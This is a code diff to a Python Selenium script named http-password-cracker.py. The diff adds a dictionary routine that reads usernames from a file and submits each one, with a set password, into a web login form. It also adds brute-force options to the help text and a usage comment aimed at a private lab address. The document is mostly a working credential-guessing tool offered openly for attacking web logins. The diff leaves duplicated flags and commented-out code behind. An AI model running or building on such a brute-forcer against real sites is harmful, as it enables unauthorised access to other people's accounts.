@@ -7,13 +7,18 @@ from selenium.webdriver.support import expected_conditions as EC
 import argparse
 import time
 from sys import argv
+
+
 #webdriver configuration
 options = webdriver.ChromeOptions()
-    # options.headless = True 
 PATH = "C:\Program Files (x86)\chromedriver.exe"
 DRIVER = webdriver.Chrome(options=options, executable_path=PATH)
+
+
 #python http-password-cracker.py host admin password admininput passwordinput 
 script, host, admin, password, admininput, passwordinput = argv
+
+
 class bgcolor:
     OKCYAN = '\033[96m'
     ENDC = '\033[0m'
@@ -26,10 +31,12 @@ def wait_to_find(input):
     except:
         print("Not found")
 
+
 def find_and_fill(input_data,input_field):
     wait_to_find(input_field)
     element = DRIVER.find_element_by_name(input_field)
     element.send_keys(input_data)
+
 
 def submit_form():
     xpath = "//input[@type='submit']"
@@ -43,10 +50,12 @@ def submit_form():
     element = DRIVER.find_element_by_xpath(xpath)
     element.send_keys(Keys.RETURN)
 
+
 def connect_to_website(website):
     options.add_experimental_option("excludeSwitches", ["enable-logging"])
     DRIVER.get(website)
     
+
 def display_logo():
     f = open('logo.txt', 'r')
     print(bgcolor.OKCYAN + f.read() + bgcolor.ENDC)
@@ -59,18 +68,49 @@ def display_logo():
     -l LOGIN or -L FILE login with LOGIN name or load list of logins 
     -p PASSWORD or -P FILE login with PASSWORD or load list of passwords
     -s Stop on matching credentials 
-    -o Store credentials in the external file""")
+    -o Store credentials in the external file
+    -s Set success text
+    -f Set failure text""")
 display_logo()
 
+def clear_fields():
+    find_and_fill("", admininput)
+    find_and_fill("", passwordinput)
 
+def dictionary_method():
+    f = open(admin, "r")
+    for line in f:
+        connect_to_website(host)
+        find_and_fill(line.strip(), admininput)
+        find_and_fill(password, passwordinput)
+        time.sleep(2)
+        submit_form()
+          
+            
+            
+        
 def main():
     display_logo()
-    connect_to_website(host)
-    find_and_fill(admin, admininput)
-    find_and_fill(password, passwordinput)
-    submit_form()
+    # connect_to_website(host)
+    # find_and_fill(admin, admininput)
+    # find_and_fill(password, passwordinput)
+    # time.sleep(2)
+    # submit_form()
+    # connect_to_website(host)
+    # find_and_fill(admin, admininput)
+    # find_and_fill(password, passwordinput)
+    # time.sleep(2)
+    # submit_form()
+    # connect_to_website(host)
+    # find_and_fill(admin, admininput)
+    # find_and_fill(password, passwordinput)
+    # time.sleep(2)
+    # submit_form()
+    dictionary_method()
+   
     
 
 if __name__ == "__main__":
     main()
 
+#python http-password-cracker.py "http://192.168.72.129/login.php" logins.txt password username password
